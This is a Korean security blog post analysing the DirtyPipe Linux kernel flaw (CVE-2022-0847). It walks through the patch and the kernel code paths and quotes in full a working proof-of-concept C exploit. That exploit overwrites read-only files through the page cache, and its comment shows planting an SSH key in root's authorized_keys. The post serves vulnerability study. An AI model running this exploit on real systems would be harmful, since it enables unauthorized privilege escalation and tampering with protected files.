---
layout		: post
markdown	: kramdown
highlighter	: rouge
title		: DirtyPipe Review
date		: 2022-03-15 00:00:00 +0900
category	: R&D
author		: seonungjang
author_email: sujang@stealien.com
background	: /assets/bg.png
profile_image: /assets/stealien_inverse.png
summary		: "DirtyPipe review by seonungjang"
thumbnail	: /assets/stealien.png
lang        : ko
permalink   : /2022-03-15/dirtypipe-review
---

# DirtyPipe Review

----

read only 파일을 arbitrary하게 write 할 수 있는 취약점이 disclosure 됐다. 이 취약점을 dirty pipe라고 부르는데 익스플로잇 내용이 이름처럼 dirty cow 취약점과 유사해 보인다.

```diff
From: Max Kellermann <max.kellermann@ionos.com>
To: linux-kernel@vger.kernel.org, viro@zeniv.linux.org.uk,
	linux-fsdevel@vger.kernel.org
Cc: Max Kellermann <max.kellermann@ionos.com>, stable@vger.kernel.org
Subject: [PATCH] lib/iov_iter: initialize "flags" in new pipe_buffer
Date: Mon, 21 Feb 2022 11:03:13 +0100	[thread overview]
Message-ID: <20220221100313.1504449-1-max.kellermann@ionos.com> (raw)

The functions copy_page_to_iter_pipe() and push_pipe() can both
allocate a new pipe_buffer, but the "flags" member initializer is
missing.

Fixes: 241699cd72a8 ("new iov_iter flavour: pipe-backed")
To: Alexander Viro <viro@zeniv.linux.org.uk>
To: linux-fsdevel@vger.kernel.org
To: linux-kernel@vger.kernel.org
Cc: stable@vger.kernel.org
Signed-off-by: Max Kellermann <max.kellermann@ionos.com>
---
 lib/iov_iter.c | 2 ++
 1 file changed, 2 insertions(+)

diff --git a/lib/iov_iter.c b/lib/iov_iter.c
index b0e0acdf96c1..6dd5330f7a99 100644
--- a/lib/iov_iter.c
+++ b/lib/iov_iter.c
@@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by
 		return 0;
 
 	buf->ops = &page_cache_pipe_buf_ops;
+	buf->flags = 0;
 	get_page(page);
 	buf->page = page;
 	buf->offset = offset;
@@ -577,6 +578,7 @@ static size_t push_pipe(struct iov_iter *i, size_t size,
 			break;
 
 		buf->ops = &default_pipe_buf_ops;
+		buf->flags = 0;
 		buf->page = page;
 		buf->offset = 0;
 		buf->len = min_t(ssize_t, left, PAGE_SIZE);
```

취약점 패치 내용을 보면,  struct pipe_buffer 오브젝트를 새로운 내용으로 초기화 해주는 과정에서 flags 필드를 초기화 안해주면서 발생하는 것으로 보인다. [published disclosure](https://dirtypipe.cm4all.com/)를 보면 flags가 이전에 초기화 된PIPE_BUF_FLAG_CAN_MERGE가 존재해서 파일을 덮을 수 있다고 나와있다.

```c
...
if ((buf->flags & PIPE_BUF_FLAG_CAN_MERGE) &&
		    offset + chars <= PAGE_SIZE) {
			ret = pipe_buf_confirm(pipe, buf);
			if (ret)
				goto out;

			ret = copy_page_from_iter(buf->page, offset, chars, from);
			if (unlikely(ret < chars)) {
				ret = -EFAULT;
				goto out;
			}

			buf->len += ret;
			if (!iov_iter_count(from))
				goto out;
		}
	}
...
```

PIPE_BUF_FLAG_CAN_MERGE는 위 코드와 같이 pipe_write 함수에서만 사용되고, struct pipe_buffer 오브젝트에 있는 page를 맵핑하고 우리가 전달한 데이터를 write하는걸 볼 수 있다. (copy_page_from_iter 함수 내부에서) 그럼 buf→page가 어디선가 읽기 위한 page가 될 수 있다는 생각을 할 수 있다.

```c
/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

int main(int argc, char **argv)
{
	if (argc != 4) {
		fprintf(stderr, "Usage: %s TARGETFILE OFFSET DATA\n", argv[0]);
		return EXIT_FAILURE;
	}

	/* dumb command-line argument parser */
	const char *const path = argv[1];
	loff_t offset = strtoul(argv[2], NULL, 0);
	const char *const data = argv[3];
	const size_t data_size = strlen(data);

	if (offset % PAGE_SIZE == 0) {
		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
		return EXIT_FAILURE;
	}

	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
	const loff_t end_offset = offset + (loff_t)data_size;
	if (end_offset > next_page) {
		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
		return EXIT_FAILURE;
	}

	/* open the input file and validate the specified offset */
	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
	if (fd < 0) {
		perror("open failed");
		return EXIT_FAILURE;
	}

	struct stat st;
	if (fstat(fd, &st)) {
		perror("stat failed");
		return EXIT_FAILURE;
	}

	if (offset > st.st_size) {
		fprintf(stderr, "Offset is not inside the file\n");
		return EXIT_FAILURE;
	}

	if (end_offset > st.st_size) {
		fprintf(stderr, "Sorry, cannot enlarge the file\n");
		return EXIT_FAILURE;
	}

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	prepare_pipe(p);

	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror("splice failed");
		return EXIT_FAILURE;
	}
	if (nbytes == 0) {
		fprintf(stderr, "short splice\n");
		return EXIT_FAILURE;
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = write(p[1], data, data_size);
	if (nbytes < 0) {
		perror("write failed");
		return EXIT_FAILURE;
	}
	if ((size_t)nbytes < data_size) {
		fprintf(stderr, "short write\n");
		return EXIT_FAILURE;
	}

	printf("It worked!\n");
	return EXIT_SUCCESS;
}
```

간단하게 read only 파일을 수정하는 PoC 코드이다. 위 코드에서 pipe 관련 함수와, splice라는 함수만 사용하고, PoC를 이해하기 위해 사용되는 함수들을 간단하게 알아보자

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main()
{
	int pipe_fds[2];
	char out[100] = {0,};
	pipe(pipe_fds);
	write(pipe_fds[1], "asd", 3);
	read(pipe_fds[0], out, 3);
	printf("out : %s\n", out);
	printf("hello world\n");
	return 0;
}
jack@seonunghardt:~/dirtypipe$ ./pipe
out : asd
hello world
```

pipe는 위 예제 코드와 같이 사용자가 데이터를 따로 저장하지 않고 FIFO 형식으로 데이터를 주고 받기 위한 서비스다. 간단하게 커널에서 어떻게 동작하는지 알아보자.

```c
static ssize_t
pipe_write(struct kiocb *iocb, struct iov_iter *from)
{
	...
	if (!pipe_full(head, pipe->tail, pipe->max_usage)) {
			unsigned int mask = pipe->ring_size - 1;
			struct pipe_buffer *buf = &pipe->bufs[head & mask];
			struct page *page = pipe->tmp_page;
			int copied;

			if (!page) {
				page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);
				if (unlikely(!page)) {
					ret = ret ? : -ENOMEM;
					break;
				}
				pipe->tmp_page = page;
			}

			/* Allocate a slot in the ring in advance and attach an
			 * empty buffer.  If we fault or otherwise fail to use
			 * it, either the reader will consume it or it'll still
			 * be there for the next write.
			 */
			spin_lock_irq(&pipe->rd_wait.lock);

			head = pipe->head;
			if (pipe_full(head, pipe->tail, pipe->max_usage)) {
				spin_unlock_irq(&pipe->rd_wait.lock);
				continue;
			}

			pipe->head = head + 1;
			spin_unlock_irq(&pipe->rd_wait.lock);

			/* Insert it into the buffer array */
			buf = &pipe->bufs[head & mask];
			buf->page = page;
			buf->ops = &anon_pipe_buf_ops;
			buf->offset = 0;
			buf->len = 0;
			if (is_packetized(filp))
				buf->flags = PIPE_BUF_FLAG_PACKET;
			else
				buf->flags = PIPE_BUF_FLAG_CAN_MERGE;
			pipe->tmp_page = NULL;

			copied = copy_page_from_iter(page, 0, PAGE_SIZE, from);
			if (unlikely(copied < PAGE_SIZE && iov_iter_count(from))) {
				if (!ret)
					ret = -EFAULT;
				break;
			}
...
```

pipe에 데이터를 write하면 pipe_write 함수가 호출된다.(create_pipe_files, pipefifo_fops 참고해주세요.) pipe_write 함수는 새로운 page를 할당해서 struct pipe_buffer 오브젝트에 넣고, copy_page_from_iter 함수에서 page를 맵핑하고 우리가 전달한 데이터를 쓴다.

```c
if (!pipe_empty(head, tail)) {
			struct pipe_buffer *buf = &pipe->bufs[tail & mask];
			size_t chars = buf->len;
			size_t written;
			int error;

			if (chars > total_len) {
				if (buf->flags & PIPE_BUF_FLAG_WHOLE) {
					if (ret == 0)
						ret = -ENOBUFS;
					break;
				}
				chars = total_len;
			}

			error = pipe_buf_confirm(pipe, buf);
			if (error) {
				if (!ret)
					ret = error;
				break;
			}

			written = copy_page_to_iter(buf->page, buf->offset, chars, to);
			if (unlikely(written < chars)) {
				if (!ret)
					ret = -EFAULT;
				break;
			}
```

pipe를 read하면, pipe_read 함수가 호출되는데, pipe_write 함수에서 할당한 page로부터 데이터를 읽어온다.

정리해보자면, pipe는 커널에서 만든 페이지에 데이터를 쓰고 읽으며 동작한다.

다음으로 splice 함수를 봐보자.

```c
ssize_t splice(int fd_in, off64_t *off_in, int fd_out, off64_t *off_out, size_t len, unsigned int flags);
```

splice 함수는 두개의 파일 디스크립터를 받아서 데이터를 복사해주는 함수이고, 위 프로토타입과 같이 fd_in에 전달한 파일 디스크립터의 내용을 fd_out로 len만큼 데이터를 복사한다.

```c
ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
```

PoC에서 splice 함수를 호출 할 때 fd_in에 write하고 싶은 파일 디스크립터(읽기만 가능한)를 전달하고, fd_out에 pipe 파일 디스크립터를 전달한다. 커널에서 splice 함수가 어떻게 데이터를 복사하게 되는지, 이 과정에서 buf→page에 추후 읽게 되는 파일의 page가 들어가게 되는지 간단하게 봐보자.

```c
SYSCALL_DEFINE6(splice, int, fd_in, loff_t __user *, off_in,
		int, fd_out, loff_t __user *, off_out,
		size_t, len, unsigned int, flags)
{
	struct fd in, out;
	long error;

	if (unlikely(!len))
		return 0;

	if (unlikely(flags & ~SPLICE_F_ALL))
		return -EINVAL;

	error = -EBADF;
	in = fdget(fd_in);
	if (in.file) {
		out = fdget(fd_out);
		if (out.file) {
			error = __do_splice(in.file, off_in, out.file, off_out,
						len, flags);
			fdput(out);
		}
		fdput(in);
	}
	return error;
}
```

splice 함수에 전달 된 2개의 파일 디스크립터로 file 오브젝트를 구하고 __do_splice 함수로 전달한다.

```c
static long __do_splice(struct file *in, loff_t __user *off_in,
			struct file *out, loff_t __user *off_out,
			size_t len, unsigned int flags)
{
	struct pipe_inode_info *ipipe;
	struct pipe_inode_info *opipe;
	loff_t offset, *__off_in = NULL, *__off_out = NULL;
	long ret;

	ipipe = get_pipe_info(in, true);
	opipe = get_pipe_info(out, true);

	if (ipipe && off_in)
		return -ESPIPE;
	if (opipe && off_out)
		return -ESPIPE;

	if (off_out) {
		if (copy_from_user(&offset, off_out, sizeof(loff_t)))
			return -EFAULT;
		__off_out = &offset;
	}
	if (off_in) {
		if (copy_from_user(&offset, off_in, sizeof(loff_t)))
			return -EFAULT;
		__off_in = &offset;
	}

	ret = do_splice(in, __off_in, out, __off_out, len, flags);
	if (ret < 0)
		return ret;

	if (__off_out && copy_to_user(off_out, __off_out, sizeof(loff_t)))
		return -EFAULT;
	if (__off_in && copy_to_user(off_in, __off_in, sizeof(loff_t)))
		return -EFAULT;

	return ret;
}
```

전달 된 file 오브젝트로부터 pipe_inode_info를 구해와서 기타 인자와 함께 검증하고 _splice 함수를 호출한다.

```c
long do_splice(struct file *in, loff_t *off_in, struct file *out,
	       loff_t *off_out, size_t len, unsigned int flags)
{
	struct pipe_inode_info *ipipe;
	struct pipe_inode_info *opipe;
	loff_t offset;
	long ret;

	if (unlikely(!(in->f_mode & FMODE_READ) ||
		     !(out->f_mode & FMODE_WRITE)))
		return -EBADF;

	ipipe = get_pipe_info(in, true);
	opipe = get_pipe_info(out, true);

	if (ipipe && opipe) {
		if (off_in || off_out)
			return -ESPIPE;

		/* Splicing to self would be fun, but... */
		if (ipipe == opipe)
			return -EINVAL;

		if ((in->f_flags | out->f_flags) & O_NONBLOCK)
			flags |= SPLICE_F_NONBLOCK;

		return splice_pipe_to_pipe(ipipe, opipe, len, flags);
	}

	if (ipipe) {
		if (off_in)
			return -ESPIPE;
		if (off_out) {
			if (!(out->f_mode & FMODE_PWRITE))
				return -EINVAL;
			offset = *off_out;
		} else {
			offset = out->f_pos;
		}

		if (unlikely(out->f_flags & O_APPEND))
			return -EINVAL;

		ret = rw_verify_area(WRITE, out, &offset, len);
		if (unlikely(ret < 0))
			return ret;

		if (in->f_flags & O_NONBLOCK)
			flags |= SPLICE_F_NONBLOCK;

		file_start_write(out);
		ret = do_splice_from(ipipe, out, &offset, len, flags);
		file_end_write(out);

		if (!off_out)
			out->f_pos = offset;
		else
			*off_out = offset;

		return ret;
	}

	if (opipe) {
		if (off_out)
			return -ESPIPE;
		if (off_in) {
			if (!(in->f_mode & FMODE_PREAD))
				return -EINVAL;
			offset = *off_in;
		} else {
			offset = in->f_pos;
		}

		if (out->f_flags & O_NONBLOCK)
			flags |= SPLICE_F_NONBLOCK;

		ret = splice_file_to_pipe(in, opipe, &offset, len, flags);
		if (!off_in)
			in->f_pos = offset;
		else
			*off_in = offset;

		return ret;
	}

	return -EINVAL;
}
```

파일 디스크립터에 대한 여러가지 검사 후, 타입에 따라 하위 함수를 호출하게 되는데, PoC 코드에서 fd_in을 pipe 파일 디스크립터가 아닌 것으로, fd_out을 pipe 파일 디스크립터로 전달했기 때문에 splice_file_to_pipe 함수가 호출 된다.

```c
long splice_file_to_pipe(struct file *in,
			 struct pipe_inode_info *opipe,
			 loff_t *offset,
			 size_t len, unsigned int flags)
{
	long ret;

	pipe_lock(opipe);
	ret = wait_for_space(opipe, flags);
	if (!ret)
		ret = do_splice_to(in, offset, opipe, len, flags);
	pipe_unlock(opipe);
	if (ret > 0)
		wakeup_pipe_readers(opipe);
	return ret;
}
```

splice_file_to_pipe 함수는 pipe_inode_info 오브젝트에 대한 검사와 do_splice_to 함수를 호출한다.

```c
static long do_splice_to(struct file *in, loff_t *ppos,
			 struct pipe_inode_info *pipe, size_t len,
			 unsigned int flags)
{
	unsigned int p_space;
	int ret;

	if (unlikely(!(in->f_mode & FMODE_READ)))
		return -EBADF;

	/* Don't try to read more the pipe has space for. */
	p_space = pipe->max_usage - pipe_occupancy(pipe->head, pipe->tail);
	len = min_t(size_t, len, p_space << PAGE_SHIFT);

	ret = rw_verify_area(READ, in, ppos, len);
	if (unlikely(ret < 0))
		return ret;

	if (unlikely(len > MAX_RW_COUNT))
		len = MAX_RW_COUNT;

	if (unlikely(!in->f_op->splice_read))
		return warn_unsupported(in, "read");
	return in->f_op->splice_read(in, ppos, pipe, len, flags);
}
```

또 다른 검사와 fd_in으로 전달 한 파일 디스크립터 fops에 등록된 splice_read함수를 실행한다.

```c
ssize_t generic_file_splice_read(struct file *in, loff_t *ppos,
				 struct pipe_inode_info *pipe, size_t len,
				 unsigned int flags)
{
	struct iov_iter to;
	struct kiocb kiocb;
	unsigned int i_head;
	int ret;

	iov_iter_pipe(&to, READ, pipe, len);
	i_head = to.head;
	init_sync_kiocb(&kiocb, in);
	kiocb.ki_pos = *ppos;
	ret = call_read_iter(in, &kiocb, &to);
	if (ret > 0) {
		*ppos = kiocb.ki_pos;
		file_accessed(in);
	} else if (ret < 0) {
		to.head = i_head;
		to.iov_offset = 0;
		iov_iter_advance(&to, 0); /* to free what was emitted */
		/*
		 * callers of ->splice_read() expect -EAGAIN on
		 * "can't put anything in there", rather than -EFAULT.
		 */
		if (ret == -EFAULT)
			ret = -EAGAIN;
	}

	return ret;
}
```

socket, trace쪽이 아니라면 일반적으로 generic_file_read_iter 함수가 호출된다. 읽고 쓰기 위한 파일 디스크립터 정보들을 struct iov_iter와 struct kiocb에 초기화 해주고 call_read_iter 함수를 호출한다.

```c
static inline ssize_t call_read_iter(struct file *file, struct kiocb *kio,
				     struct iov_iter *iter)
{
	return file->f_op->read_iter(kio, iter);
}
```

read_iter 함수를 호출하는데 파일 시스템마다 다르지만 일반적으로는 generic_file_read_iter 함수를 호출한다.  

```c
ssize_t filemap_read(struct kiocb *iocb, struct iov_iter *iter,
		ssize_t already_read)
{
	struct file *filp = iocb->ki_filp;
	struct file_ra_state *ra = &filp->f_ra;
	struct address_space *mapping = filp->f_mapping;
	struct inode *inode = mapping->host;
	struct folio_batch fbatch;
	int i, error = 0;
	bool writably_mapped;
	loff_t isize, end_offset;

	if (unlikely(iocb->ki_pos >= inode->i_sb->s_maxbytes))
		return 0;
	if (unlikely(!iov_iter_count(iter)))
		return 0;

	iov_iter_truncate(iter, inode->i_sb->s_maxbytes);
	folio_batch_init(&fbatch);

	do {
		cond_resched();

		/*
		 * If we've already successfully copied some data, then we
		 * can no longer safely return -EIOCBQUEUED. Hence mark
		 * an async read NOWAIT at that point.
		 */
		if ((iocb->ki_flags & IOCB_WAITQ) && already_read)
			iocb->ki_flags |= IOCB_NOWAIT;

		if (unlikely(iocb->ki_pos >= i_size_read(inode)))
			break;

		error = filemap_get_pages(iocb, iter, &fbatch);
		if (error < 0)
			break;

		/*
		 * i_size must be checked after we know the pages are Uptodate.
		 *
		 * Checking i_size after the check allows us to calculate
		 * the correct value for "nr", which means the zero-filled
		 * part of the page is not copied back to userspace (unless
		 * another truncate extends the file - this is desired though).
		 */
		isize = i_size_read(inode);
		if (unlikely(iocb->ki_pos >= isize))
			goto put_folios;
		end_offset = min_t(loff_t, isize, iocb->ki_pos + iter->count);

		/*
		 * Once we start copying data, we don't want to be touching any
		 * cachelines that might be contended:
		 */
		writably_mapped = mapping_writably_mapped(mapping);

		/*
		 * When a sequential read accesses a page several times, only
		 * mark it as accessed the first time.
		 */
		if (iocb->ki_pos >> PAGE_SHIFT !=
		    ra->prev_pos >> PAGE_SHIFT)
			folio_mark_accessed(fbatch.folios[0]);

		for (i = 0; i < folio_batch_count(&fbatch); i++) {
			struct folio *folio = fbatch.folios[i];
			size_t fsize = folio_size(folio);
			size_t offset = iocb->ki_pos & (fsize - 1);
			size_t bytes = min_t(loff_t, end_offset - iocb->ki_pos,
					     fsize - offset);
			size_t copied;

			if (end_offset < folio_pos(folio))
				break;
			if (i > 0)
				folio_mark_accessed(folio);
			/*
			 * If users can be writing to this folio using arbitrary
			 * virtual addresses, take care of potential aliasing
			 * before reading the folio on the kernel side.
			 */
			if (writably_mapped)
				flush_dcache_folio(folio);

			copied = copy_folio_to_iter(folio, offset, bytes, iter);

			already_read += copied;
			iocb->ki_pos += copied;
			ra->prev_pos = iocb->ki_pos;

			if (copied < bytes) {
				error = -EFAULT;
				break;
			}
		}
put_folios:
		for (i = 0; i < folio_batch_count(&fbatch); i++)
			folio_put(fbatch.folios[i]);
		folio_batch_init(&fbatch);
	} while (iov_iter_count(iter) && iocb->ki_pos < isize && !error);

	file_accessed(filp);

	return already_read ? already_read : error;
}
```

generic_file_read_iter 함수는 filemap_read 함수를 호출한다. 이 함수에서는 splice 함수의 핵심인 파일을 읽고 복사를 한다. 여기서 page cache 개념을 짚고 넘어가야한다. 운영체계에서 cpu가 디스크 I/O 작업을 하면서 직접적으로 디스크에 access 할 때 오버헤드가 크기 때문에 디스크의 내용을 읽어 page cache에다가 저장해두고 다음에 읽을 때 page cache로 부터 내용을 읽어온다. filemap_read 함수는 page cache로부터 내용을 읽어오고 정확히는 filemap_get_pages에서 page cache의 folio를 fbatch에 담아온다. 만약에 page cache가 없다면 다음 reader를 위해 folio를 할당해서 page cache에다가 추가하는 과정도 함께 있다.

위 코드가 구조적으로 왜 존재하는지, page cache과 folio에 관한 자세한 내용은 아래 레퍼런스를 참고해주세요.

- [https://hyeyoo.com/149](https://hyeyoo.com/149)
- [https://github.com/gurugio/book_linuxkernel_blockdrv/blob/master/pagecacheand_blockdriver.md](https://github.com/gurugio/book_linuxkernel_blockdrv/blob/master/pagecacheand_blockdriver.md)
- [https://www.cnblogs.com/luozhiyun/p/13061199.html](https://www.cnblogs.com/luozhiyun/p/13061199.html)

```c
static inline size_t copy_folio_to_iter(struct folio *folio, size_t offset,
		size_t bytes, struct iov_iter *i)
{
	return copy_page_to_iter(&folio->page, offset, bytes, i);
}
```

page cache를 copy_page_to_iter 함수에 전달한다.

```c
size_t copy_page_to_iter(struct page *page, size_t offset, size_t bytes,
			 struct iov_iter *i)
{
	size_t res = 0;
	if (unlikely(!page_copy_sane(page, offset, bytes)))
		return 0;
	page += offset / PAGE_SIZE; // first subpage
	offset %= PAGE_SIZE;
	while (1) {
		size_t n = __copy_page_to_iter(page, offset,
				min(bytes, (size_t)PAGE_SIZE - offset), i);
		res += n;
		bytes -= n;
		if (!bytes || !n)
			break;
		offset += n;
		if (offset == PAGE_SIZE) {
			page++;
			offset = 0;
		}
	}
	return res;
}
```

```c
static size_t __copy_page_to_iter(struct page *page, size_t offset, size_t bytes,
			 struct iov_iter *i)
{
	if (likely(iter_is_iovec(i)))
		return copy_page_to_iter_iovec(page, offset, bytes, i);
	if (iov_iter_is_bvec(i) || iov_iter_is_kvec(i) || iov_iter_is_xarray(i)) {
		void *kaddr = kmap_local_page(page);
		size_t wanted = _copy_to_iter(kaddr + offset, bytes, i);
		kunmap_local(kaddr);
		return wanted;
	}
	if (iov_iter_is_pipe(i))
		return copy_page_to_iter_pipe(page, offset, bytes, i);
	if (unlikely(iov_iter_is_discard(i))) {
		if (unlikely(i->count < bytes))
			bytes = i->count;
		i->count -= bytes;
		return bytes;
	}
	WARN_ON(1);
	return 0;
}
```

```c
static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t bytes,
			 struct iov_iter *i)
{
	struct pipe_inode_info *pipe = i->pipe;
	struct pipe_buffer *buf;
	unsigned int p_tail = pipe->tail;
	unsigned int p_mask = pipe->ring_size - 1;
	unsigned int i_head = i->head;
	size_t off;

	if (unlikely(bytes > i->count))
		bytes = i->count;

	if (unlikely(!bytes))
		return 0;

	if (!sanity(i))
		return 0;

	off = i->iov_offset;
	buf = &pipe->bufs[i_head & p_mask];
	if (off) {
		if (offset == off && buf->page == page) {
			/* merge with the last one */
			buf->len += bytes;
			i->iov_offset += bytes;
			goto out;
		}
		i_head++;
		buf = &pipe->bufs[i_head & p_mask];
	}
	if (pipe_full(i_head, p_tail, pipe->max_usage))
		return 0;

	buf->ops = &page_cache_pipe_buf_ops;
	get_page(page);
	buf->page = page;
	buf->offset = offset;
	buf->len = bytes;

	pipe->head = i_head + 1;
	i->iov_offset = offset + bytes;
	i->head = i_head;
out:
	i->count -= bytes;
	return bytes;
}
```

copy_page_to_iter -> __copy_page_to_iter -> copy_page_to_iter_pipe 순으로 copy_page_to_iter_pipe 함수가(취약점이 패치 된) 호출되고, 우리가 읽고자하는 파일의 page cache가 struct pipe_buffer 오브젝트에 초기화 된다. **이 때** **기존에** **PIPE_BUF_FLAG_CAN_MERGE와 함께 초기화 된 struct pipe_buffer 오브젝트가 있다면 buf→flags를 초기화 하지 않기 때문에 buf→page에 들어오는 어떤 page든 우리의 데이터를 쓸 수 있게 되는 것이다. (이 때 page cache가 초기화 됨)**

취약점을 트리거 하기 위한 copy_page_to_iter_pipe 함수는 아래 순서와 같이 호출된다.

splice -> __do_splice -> do_splice -> splice_file_to_pipe -> do_splice_to -> generic_file_splice_read -> call_read_iter -> generic_file_read_iter -> filemap_read -> copy_folio_to_iter -> copy_page_to_iter -> __copy_page_to_iter -> copy_page_to_iter_pipe

```c
static ssize_t
pipe_write(struct kiocb *iocb, struct iov_iter *from)
{
	struct file *filp = iocb->ki_filp;
	struct pipe_inode_info *pipe = filp->private_data;
	unsigned int head;
	ssize_t ret = 0;
	size_t total_len = iov_iter_count(from);
	ssize_t chars;
	bool was_empty = false;
	bool wake_next_writer = false;

	...

	head = pipe->head;
	was_empty = pipe_empty(head, pipe->tail);
	chars = total_len & (PAGE_SIZE-1);
	if (chars && !was_empty) {
		unsigned int mask = pipe->ring_size - 1;
		struct pipe_buffer *buf = &pipe->bufs[(head - 1) & mask];
		int offset = buf->offset + buf->len;

		if ((buf->flags & PIPE_BUF_FLAG_CAN_MERGE) &&
		    offset + chars <= PAGE_SIZE) {
			ret = pipe_buf_confirm(pipe, buf);
			if (ret)
				goto out;

			ret = copy_page_from_iter(buf->page, offset, chars, from);
			if (unlikely(ret < chars)) {
				ret = -EFAULT;
				goto out;
			}

			buf->len += ret;
			if (!iov_iter_count(from))
				goto out;
		}
	}

	...
}
```

최종적으로 pipe_write 함수를 호출하면, buf->flags & PIPE_BUF_FLAG_CAN_MERGE를 통과하고 copy_page_from_iter 함수 호출과 함께 buf→page에 있는 page cache가 우리의 데이터로 덮히게 된다. 다시 똑같은 파일을 읽게 된다면, 우리가 수정한 내용이 담겨있는 page cache를 읽게된다.